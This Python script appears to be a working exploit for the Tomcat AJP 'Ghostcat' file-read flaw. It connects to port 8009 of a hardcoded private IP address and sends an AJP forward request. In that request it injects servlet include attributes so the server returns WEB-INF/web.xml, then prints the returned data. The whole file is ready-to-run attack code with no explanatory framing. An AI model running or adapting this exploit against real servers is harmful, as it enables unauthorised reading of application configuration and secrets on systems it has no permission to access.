#!/usr/bin/env python

from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
from pprint import pprint, pformat

import socket
import argparse
import logging
import re
import os
import logging
from colorlog import ColoredFormatter

def setup_logger():
	formatter = ColoredFormatter(
		"[%(asctime)s.%(msecs)03d] %(log_color)s%(levelname)-8s%(reset)s %(white)s%(message)s",
		datefmt="%Y-%m-%d %H:%M:%S",
		reset=True,
		log_colors={
			'DEBUG':	'bold_purple',
			'INFO':	 	'bold_green',
			'WARNING':  'bold_yellow',
			'ERROR':	'bold_red',
			'CRITICAL': 'bold_red',
		}
	)

	logger = logging.getLogger('meow')
	handler = logging.StreamHandler()
	handler.setFormatter(formatter)
	logger.addHandler(handler)
	logger.setLevel(logging.DEBUG)

	return logger

logger = setup_logger()

def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
	fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
	fr.method = method
	fr.protocol = "HTTP/1.1"
	fr.req_uri = req_uri
	fr.remote_addr = target_host
	fr.remote_host = None
	fr.server_name = target_host
	fr.server_port = 80
	fr.request_headers = {
		'SC_REQ_ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'SC_REQ_CONNECTION': 'keep-alive',
		'SC_REQ_CONTENT_LENGTH': '0',
		'SC_REQ_HOST': target_host,
		'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'en-US,en;q=0.5',
		'Upgrade-Insecure-Requests': '1',
		'Cache-Control': 'max-age=0'
	}
	fr.is_ssl = False

	fr.attributes = []

	return fr


class Tomcat(object):
	def __init__(self, target_host, target_port):
		self.target_host = target_host
		self.target_port = target_port

		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.connect((target_host, target_port))
		self.stream = self.socket.makefile("rb", bufsize=0)


	def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
		self.req_uri = req_uri
		self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
		logger.debug("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))

		for a in attributes:
			self.forward_request.attributes.append(a)

		responses = self.forward_request.send_and_receive(self.socket, self.stream)
		if len(responses) == 0:
			return None, None

		snd_hdrs_res = responses[0]

		data_res = responses[1:-1]
		if len(data_res) == 0:
			logger.info("No data in response. Headers:\n %s" % pformat(vars(snd_hdrs_res)))

		return snd_hdrs_res, data_res


attributes = [
    {"name": "req_attribute", "value": ("javax.servlet.include.request_uri", "WEB-INF/web.xml")},
    {"name": "req_attribute", "value": ("javax.servlet.include.path_info", "WEB-INF/web.xml")},
    {"name": "req_attribute", "value": ("javax.servlet.include.servlet_path", "/")},
]
target = '192.168.185.191'
port = 8009
server = Tomcat(target,port)
res, data = server.perform_request("/noexist.jsp", attributes=attributes)
for i in data:
    print(i.data)
